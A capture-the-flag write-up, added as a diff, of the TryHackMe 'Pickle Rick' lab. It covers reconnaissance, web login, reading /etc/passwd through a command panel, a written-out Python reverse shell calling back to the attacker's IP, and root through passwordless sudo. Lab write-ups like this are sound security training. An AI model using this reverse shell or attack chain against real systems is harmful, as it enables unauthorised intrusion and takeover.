@@ -1,0 +1,227 @@
+TRYHACKME CTF
+
+ROOM : PICKLE RICK
+
+https://tryhackme.com/room/picklerick
+
+nmap -sC -sV <ip>
+
+>>
+PORT   STATE SERVICE REASON  VERSION
+22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 ba:7d:09:56:19:90:6b:c6:14:56:80:57:e7:61:53:6d (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7tFX9MEunOnjgL39fwzsLeFNFZ7HftSj5qCYr3hIGOAhYVFSAy3QpNx1r0JzBFXfv0umFZvWfn24rMf/VDOLReVxEw7ElK3pd3s9MAircVOTQAPXQWHtqDJ7ZdbOmBWe9NHp1Ei8tDhmNtptQkRSHCSs/c6DUrGWMzwPrki9Y2qw5bWEovYkjXWvgLfQ+zrtYZAx6yDkdd3NI2wbgTz8G41IiI9iwXnINhA3+3pISidXJVoV/a4kJw+tSCtP2Flf2N+W5W+PB/D0n36Iu2ZHU/Vcr7oN2WV0smZ9MvHe177sExszp4HySjeGNMkBGGB07e4rhMcX3zHZl/7KyejGL
+|   256 32:b6:e7:6c:d2:8a:dd:ee:fc:2c:13:c9:a7:08:e9:dc (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEYy+wYRAMoDGUt7tV8Btospcyy55vBnbxVNeAP2gn3cQageqLF1+gbUCH6v0fX45ofjzhtYYzc+wSqKih5KApA=
+|   256 f1:6c:6f:3e:4b:2f:bb:bc:ba:45:9a:31:bb:e0:b9:fe (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINn4KjmTbIJyFiy4wEaiY6Nht8nUOczZmIjQSadF72n5
+80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Rick is sup4r cool
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+>>
+
+We check the webserver and find username in the source code.
+
+Brute forcing web directories showed a login.php page as well as a password found in a common file.
+
+We try the username and the possible password and we are welcomed to a portal page.
+
+We see a Command Panel.
+
+This is great because we have code execution right off the bat, although limited.
+
+ls works :
+>>
+Sup3rS3cretPickl3Ingred.txt
+assets
+clue.txt
+denied.php
+index.html
+login.php
+portal.php
+robots.txt
+>>
+
+cat, doesn't work so we try less <file>
+
+less clue.txt 
+>>
+Look around the file system for the other ingredient.
+>>
+
+We find the first flag in one of the files.
+less Sup3rS3cretPickl3Ingred.txt
+**. ******* ****
+
+Exploring other directories yielded another secret ingredient/flag. Clue : Look for Rick's directory!
+
+ls /home/rick
+>>
+second ingredients
+>>
+
+If you can't view the file, use double quotes. 
+
+less "second ingredients"
+>>
+* ***** ****
+>>
+
+Still using the Command Panel, 
+
+typing "less denied.php" shows this in the source code
+>>
+ session_start();
+if($_SESSION["login"] == false) {
+   header("Location: /login.php"); die();
+}
+?>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+>>
+
+I thought of using burp, but it's now irrelevant.
+
+We also find a base64 string within webpage source but it seemed irrelevant also. 
+
+Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0== 
+
+Decoding this string shows : Data is not a valid byteArray: [86,109,112,71,85,49,7...
+
+moving forward :
+
+less /etc/passwd 
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
+systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
+systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
+syslog:x:104:108::/home/syslog:/bin/false
+_apt:x:105:65534::/nonexistent:/bin/false
+lxd:x:106:65534::/var/lib/lxd/:/bin/false
+messagebus:x:107:111::/var/run/dbus:/bin/false
+uuidd:x:108:112::/run/uuidd:/bin/false
+dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
+sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
+pollinate:x:111:1::/var/cache/pollinate:/bin/false
+ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
+
+We find that we have an Ubuntu user with shell.
+
+less /etc/shadow doesn't work.
+
+ls -al /home/ubuntu
+>>
+total 40
+drwxr-xr-x 4 ubuntu ubuntu 4096 Feb 10  2019 .
+drwxr-xr-x 4 root   root   4096 Feb 10  2019 ..
+-rw------- 1 ubuntu ubuntu  320 Feb 10  2019 .bash_history
+-rw-r--r-- 1 ubuntu ubuntu  220 Aug 31  2015 .bash_logout
+-rw-r--r-- 1 ubuntu ubuntu 3771 Aug 31  2015 .bashrc
+drwx------ 2 ubuntu ubuntu 4096 Feb 10  2019 .cache
+-rw-r--r-- 1 ubuntu ubuntu  655 May 16  2017 .profile
+drwx------ 2 ubuntu ubuntu 4096 Feb 10  2019 .ssh
+-rw-r--r-- 1 ubuntu ubuntu    0 Feb 10  2019 .sudo_as_admin_successful
+-rw------- 1 ubuntu ubuntu 4267 Feb 10  2019 .viminfo
+>>
+
+All this work using the command panel is a bit of a hassle, so I try a reverse-shell.
+
+I used https://www.revshells.com <enter your local ip and listening port>
+
+I tried php and mkfifo reverse shells. 
+
+<Python3 shortest> worked.
+
+python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.2.81.205",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'
+
+┌──(kali㉿kali)-[~/Desktop]
+└─$ nc -lvp 4444                                                       130 ⨯
+listening on [any] 4444 ...
+10.10.103.238: inverse host lookup failed: Unknown host
+connect to [10.2.81.205] from (UNKNOWN) [10.10.103.238] 52816
+$ 
+
+TIME TO ROCK.
+
+whoami
+www-data
+$ uname -mrs
+uname -mrs
+Linux 4.4.0-1072-aws x86_64
+$ python3 -c 'import pty; pty.spawn("/bin/bash")' : works!
+
+
+www-data@ip-10-10-103-238:/var/www/html$ 
+
+After exploring directories and files, I simply tried the standard sudo -l for privilege escalation.
+
+ww-data@ip-10-10-103-238:/var/www/html$ sudo -l
+sudo -l
+Matching Defaults entries for www-data on
+    ip-10-10-103-238.eu-west-1.compute.internal:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on
+        ip-10-10-103-238.eu-west-1.compute.internal:
+    (ALL) NOPASSWD: ALL
+    
+To my surprise, sudo does not require a password for ALL commands! (even as www-data!)    
+    
+www-data@ip-10-10-103-238:/var/www/html$ sudo su
+sudo su
+
+root@ip-10-10-103-238:/var/www/html# 
+
+Easy as pie!
+
+root@ip-10-10-103-238:/# ls
+bin   etc         lib         media  proc  sbin  sys  var
+boot  home        lib64       mnt    root  snap  tmp  vmlinuz
+dev   initrd.img  lost+found  opt    run   srv   usr
+
+root@ip-10-10-103-238:/# cd root
+cd root
+
+root@ip-10-10-103-238:~# ls
+ls
+3rd.txt  snap
+
+We find the third ingredient!
+
+root@ip-10-10-103-238:~# cat 3rd.txt
+cat 3rd.txt
+3rd ingredients: ***** *****
+
+root@ip-10-10-103-238:~# 
+
+Thank you for a fun CTF Rick, Morty and TRYHACKME!
+
+
+
+
+
